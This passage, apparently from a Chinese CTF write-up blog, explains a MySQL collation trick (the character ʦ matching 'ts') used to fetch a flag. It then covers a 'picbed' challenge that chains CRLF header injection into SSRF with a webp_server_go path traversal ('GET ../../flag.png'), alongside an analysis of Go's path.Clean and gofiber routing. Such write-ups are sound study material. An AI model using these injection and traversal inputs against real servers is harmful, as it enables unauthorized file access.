<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Ä = A</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ö = O</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ü = U</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>但有个特别有意思的案例，就是一个特殊字符可能可以对应多个标准字符，比如：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ß = ss</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>与本题无关，不过如果不是<code>_unicode_ci</code>可能会扩展一些这样的规则，比如德语的<code>utf8mb4_german2_ci</code>排序规则下有这些规则：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Ä = Æ = AE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ö = Œ = OE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ü = UE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ß = ss</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>（想到一些国产软件里面，会把汉字按拼音和英文一起排序，是不是也是相同的原理呢？）</p>
<p>联想到刚才有个被划出来的提示，有没有什么字符等效于<code>ts</code>呢？我们可以去<a href="https://www.unicode.org/Public/UCA/4.0.0/allkeys-4.0.0.txt" target="_blank" rel="noopener noreferrer">Unicode官方</a>的文件中找一找，结果真的有：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">02A6  ; [.1002.0020.0004.02A6][.0FEA.0020.0004.02A6] # LATIN SMALL LETTER TS DIGRAPH; QQKN</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在Python中，<code>chr(0x2a6)</code>会返回<code>ʦ</code>，确实看着像ts两个字符拼起来。这个字符可以成功达成在Python里是一个字符，但是在SQL是两个字符的奇景，于是我们传<code>?type=secreʦ</code>就能拿到flag了。</p>
<p>顺便一提，如果你在浏览器里用Ctrl+F搜索功能搜索<code>ʦ</code>这个字，你会发现所有<code>ts</code>也能被搜出来。这个现象大大冲击了我的认知：在数据库的世界里，或许<code>ʦ</code>和<code>ts</code>本就是同样的东西。</p>
<p><code>flag{sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1}</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web---picbed">web - picbed<a href="#web---picbed" class="hash-link" aria-label="web - picbed的直接链接" title="web - picbed的直接链接">​</a></h2>
<p>最喜欢也花了最多精力，虽然很多精力其实和本题无关就是了。</p>
<p>这个题是在GO开源项目<code>webp_server_go</code>基础上包了一个Flask前端，可以上传图片并以webp格式返回。首先审计一下Flask源码</p>
<ul>
<li>上传接口<code>/upload</code>，需要文件名的扩展名为字母或数字，然后以<code>f&quot;pics/{os.urandom(8).hex()}.{ext}&quot;</code>存储在服务器上。（工作目录为<code>/opt</code>）。这个random hash文件名防止了上传路径穿越。</li>
<li>获取图片接口<code>/pics/&lt;filename&gt;</code>，首先确保请求的文件存在于服务器上，然后会向后端的<code>webp_server_go</code>创建一个socket发送HTTP请求。我们可以带一个<code>Accept</code>请求头，Flask会对请求头进行<code>urlparse.unquote_plus</code>之后嵌入在对后台的请求里。但这个处理实际上很糟糕，因为我只要带上<code>%0D%0A</code>换行后请求头就不再是请求头了，我们可以把HTTP报文截断并发送任意内容，而服务器返回的只是最后一个HTTP报文的内容。这实际上达成了对后台<code>webp_server_go</code>的SSRF。</li>
<li><code>/flag.png</code>位于根目录，工作目录之外，所以读到它需要个目录穿越。</li>
</ul>
<p>因为有SSRF，所以我们重点就在后面的webp_serverp_go上了，fuzzing过程中，虽然发现有些情况下会crash掉，用<code>%2e%2e</code>会让logger出现没有normalize掉的<code>..</code>，但总体没发现什么问题。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="正解webp_server_go路径穿越-cve-2021-46104plus">正解：webp_server_go路径穿越 （CVE-2021-46104，plus）<a href="#正解webp_server_go路径穿越-cve-2021-46104plus" class="hash-link" aria-label="正解：webp_server_go路径穿越 （CVE-2021-46104，plus）的直接链接" title="正解：webp_server_go路径穿越 （CVE-2021-46104，plus）的直接链接">​</a></h4>
<p>设定上这是一个0.4.0版本发现，现已经被修复的CVE ，<a href="https://github.com/webp-sh/webp_server_go/issues/92" target="_blank" rel="noopener noreferrer">相关issue有讨论</a>。最早版本似乎最简单粗暴的<code>%2e%2e%2f</code>就能穿，后来修了一些补丁，加入了<code>path.Clean</code>这样的处理，所以已经打不通了。</p>
<p>但这次发现，在HTTP报文中如果省略了开头的<code>/</code>，比如请求<code>GET ../../flag.png HTTP/1.1</code>，就会一路穿到根目录去。这个问题应该在<code>gofiber</code>库里，对URL的处理有逻辑问题。</p>
<p>这个的根源应该在于golang<code>path.Clean</code>处理原则<a href="https://cs.opensource.google/go/go/+/refs/tags/go1.22.2:src/path/path.go;l=61" target="_blank" rel="noopener noreferrer">第四条</a>：如果HTTP报文中带<code>/</code>时，这个路径就相当于一个根目录，而根目录后的<code>..</code>会被自动清除。而如果不带<code>/</code>，<code>path.Clean</code>会认为这个是相对路径。</p>
<div class="language-go codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-go codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Clean returns the shortest path name equivalent to path</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// by purely lexical processing. It applies the following rules</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// iteratively until no further processing can be done:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//  1. Replace multiple slashes with a single slash.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//  2. Eliminate each . path name element (the current directory).</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//  3. Eliminate each inner .. path name element (the parent directory)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//     along with the non-.. element that precedes it.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//  4. Eliminate .. elements that begin a rooted path:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//     that is, replace &quot;/..&quot; by &quot;/&quot; at the beginning of a path.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// The returned path ends in a slash only if it is the root &quot;/&quot;.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// If the result of this process is an empty string, Clean</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// returns the string &quot;.&quot;.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// See also Rob Pike, “Lexical File Names in Plan 9 or</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Getting Dot-Dot Right,”</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// https://9p.io/sys/doc/lexnames.html</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">func</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Clean</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path </span><span class="token builtin">string</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin">string</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同时，gofiber的<code>path.go</code>也完全匹配了<code>/*</code>，即使它不以<code>/</code>开头：</p>
<div class="language-go codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-go codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// RoutePatternMatch checks if a given path matches a Fiber route pattern.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">func</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">RoutePatternMatch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pattern </span><span class="token builtin">string</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> cfg </span><span class="token operator" style="color:#393A34">...</span><span class="token plain">Config</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin">bool</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// See logic in (*Route).match and (*App).register</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> ctxParams </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">maxParams</span><span class="token punctuation" style="color:#393A34">]</span><span class="token builtin">string</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	config </span><span class="token operator" style="color:#393A34">:=</span><span class="token plain"> Config</span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cfg</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		config </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cfg</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> path </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		path </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// Cannot have an empty pattern</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> pattern </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		pattern </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// Pattern always start with a &#x27;/&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> pattern</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token char">&#x27;/&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		pattern </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pattern</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	patternPretty </span><span class="token operator" style="color:#393A34">:=</span><span class="token plain"> pattern</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// Case-sensitive routing, all to lowercase</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!</span><span class="token plain">config</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">CaseSensitive </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		patternPretty </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> utils</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ToLower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">patternPretty</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		path </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> utils</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ToLower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// Strict routing, remove trailing slashes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!</span><span class="token plain">config</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">StrictRouting </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">patternPretty</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		patternPretty </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> strings</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">TrimRight</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">patternPretty</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	parser </span><span class="token operator" style="color:#393A34">:=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">parseRoute</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">patternPretty</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> patternPretty </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> path </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">// &#x27;*&#x27; wildcard matches any path</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> patternPretty </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/*&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// Does this route have parameters</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parser</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">params</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> match </span><span class="token operator" style="color:#393A34">:=</span><span class="token plain"> parser</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">getMatch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> path</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">ctxParams</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> match </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// Check for a simple match</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	patternPretty </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">RemoveEscapeChar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">patternPretty</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">patternPretty</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> patternPretty </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> path </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// No match</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这两点一结合，就导致实际上<code>Clean</code>根本没有把开头的<code>../</code>去掉，就传给读取文件的函数了。很难评，<code>Clean</code>觉得自己得兼容文件系统，万一用户传的就是相对路径呢。<code>gofiber</code>觉得自己得尊重用户意愿不要乱改请求头，因为自己host的不一定是文件系统，万一各个endpoint有各自功能呢，怎么能乱改。然后<code>webp_server_go</code>觉得你们两位大哥肯定把事情都办好了啊，都<code>/*</code>了前面怎么会没有<code>/</code>呢，根据文档第四条<code>path.Clean</code>那不就是直接给去掉了吗。结果就谁都没管。</p>
<p>遥想当时打USTC Hackergame2023的那道iptables题，那个题的Go服务器就很严格，HTTP报文就必须得以<code>/</code>开头，不然就报500。看来这个处理是有道理的啊。</p>
